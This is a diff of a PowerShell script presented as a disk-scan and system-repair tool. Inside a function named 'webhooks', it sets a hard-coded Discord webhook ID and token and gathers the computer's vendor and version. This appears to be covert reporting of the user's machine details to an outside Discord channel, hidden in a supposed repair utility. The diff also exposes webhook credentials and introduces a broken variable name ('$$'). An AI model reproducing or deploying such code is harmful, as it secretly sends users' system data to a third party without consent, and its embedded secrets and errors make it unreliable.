@@ -40,8 +40,10 @@ Write-Host "  SCAN DISK + FIX SYSTEM FILE + RESTORE HEALTHY" -ForegroundColor Ye
 Write-Host "------------------------------------------------------------------------------------"
 
 function webhooks {
-    $discordWebhookUrl = "https://discordapp.com/api/webhooks/1337473337823203381/0gtdn-CLf_3uhKb1skosboqeWKwF2S9DQ6H-m10B4C0NVVll2v435GbwsU4I-tCOBkAh"
-
+    $webhookid = "1337473388624609390"
+    $webhooktoken = "frh_h08OFoFeTSUUF-FqHg2ZoJVh6Xjj8YbVzgOyztWuPANtpogg0AUKPWtWC7tsswe8"
+    $$discordWebhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
+    
     $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
     $manufacturer = $computerSystem.Vendor
     $tipe = $computerSystem.Version
